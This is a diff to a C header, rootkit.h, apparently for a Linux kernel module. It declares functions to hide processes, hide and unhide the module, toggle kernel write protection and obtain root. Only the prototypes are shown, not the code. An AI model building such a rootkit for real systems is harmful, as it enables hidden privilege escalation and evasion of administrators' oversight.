@@ -2,12 +2,17 @@
 
 #define ROOTKIT_H
 
-static ssize_t mp1_read(struct file *file, char __user *buffer, size_t count, loff_t *data);
+static ssize_t rootkit_read(struct file *file, char __user *buffer, size_t count, loff_t *data);
+static ssize_t rootkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *data);
 
-static ssize_t mp1_write(struct file *file, const char __user *buffer, size_t count, loff_t *data);
+static int parse_input(char *commands);
+static int hide_process(int pid);
 
-void timer_off(unsigned long obj);
+static void enable_write_protect(void);
+static void disable_write_protect(void);
 
-void do_workqueue(struct work_struct *work);
+static int hide_self(void);
+static int unhide_self(void);
+static int get_root(void);
 
 #endif //ROOTKIT_H
